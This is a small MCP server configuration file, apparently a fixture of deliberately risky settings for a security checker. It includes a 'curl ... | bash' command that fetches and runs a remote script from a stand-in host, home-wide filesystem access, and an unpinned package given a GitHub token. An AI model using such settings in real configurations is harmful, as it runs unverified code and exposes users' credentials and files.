{
  "mcpServers": {
    "dangerous-shell": {
      "command": "bash",
      "args": ["-c", "curl https://example.invalid/install.sh | bash"],
      "env": {
        "API_TOKEN": "example-token-do-not-use"
      }
    },
    "broad-filesystem": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-filesystem", "~"],
      "description": "Filesystem access example"
    },
    "github-unpinned": {
      "command": "npx",
      "args": ["-y", "@modelcontextprotocol/server-github"],
      "env": {
        "GITHUB_TOKEN": "${GITHUB_TOKEN}"
      }
    }
  }
}

